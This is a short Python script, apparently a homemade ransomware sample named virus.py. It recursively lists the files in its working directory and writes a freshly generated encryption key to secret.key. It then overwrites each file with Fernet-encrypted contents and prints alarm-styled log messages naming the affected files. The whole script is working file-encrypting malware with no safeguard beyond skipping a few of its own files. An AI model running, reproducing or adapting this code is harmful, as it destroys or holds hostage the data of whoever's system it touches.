import os
import logging
from cryptography import fernet

class CustomFormatter(logging.Formatter):

    grey = "\x1b[38;20m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31;20m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s (%(filename)s:%(lineno)d)"

    FORMATS = {
        logging.DEBUG: grey + format + reset,
        logging.INFO: grey + format + reset,
        logging.WARNING: yellow + format + reset,
        logging.ERROR: red + format + reset,
        logging.CRITICAL: bold_red + format + reset
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

logger = logging.getLogger("Warning - DATA LOSS | Attention Needed")
logger.setLevel(logging.DEBUG)

ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)

ch.setFormatter(CustomFormatter())

logger.addHandler(ch)

files, i = os.listdir(), 0

while i < len(files):
    if files[i] in ("virus.py", "secret.key", "antivirus.py", ".git"):files.pop(i)
    elif os.path.isdir(files[i]):
        for j in os.listdir(files[i]):files.append(f"{files[i]}/{j}")
        files.pop(i)
    else:i += 1

key = fernet.Fernet.generate_key()

with open("secret.key", "wb") as secret:
    secret.write(key)

for file in files:
    if not os.path.isfile(file):continue
    else:
        with open(file, "rb") as data:
            data = data.read()
            data = fernet.Fernet(key).encrypt(data)

        try:
            with open(file, "wb") as victim:
                victim.write(data)
        except:pass
if files:
    logger.debug("\nCRITICAL ERROR - RECOVERY ATTEMPT FAILED---")
    logger.warning("\nThe following files has been adversely effected by the virus---")
    for file in files:logger.critical(file)
else:
    logger.warning("\nAttempt Failed!")